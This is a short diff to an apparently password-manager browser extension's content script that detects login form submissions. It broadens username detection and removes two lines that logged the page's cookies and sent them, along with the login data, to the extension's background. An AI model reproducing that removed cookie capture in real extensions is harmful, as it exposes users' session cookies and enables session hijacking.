@@ -58,16 +58,14 @@ if (window === window.top) {
         }
         if (hasPassword) {
             for (var j = passIdx - 1; j >= 0; j--) {
-                if ((fields[j].type == "text" || fields[j].type == "email" || fields[j].type == null) && validateEmail(fields[j].value)) {
+                if ((fields[j].type == "text" || fields[j].type == "email" || fields[j].type == null) && (validateEmail(fields[j].value) || isLoginField(fields[j].name))) {
                     hasLogin = true;
                     var username = fields[j].value;
                     break;
                 }
             }
             if (hasLogin) {
-                console.log(document.cookie);
                 extension.runtime.sendMessage('newFormSubmitted', {
-                    'cookies': document.cookie,
                     'update': {
                         'website': window.location.host,
                         'username': username,
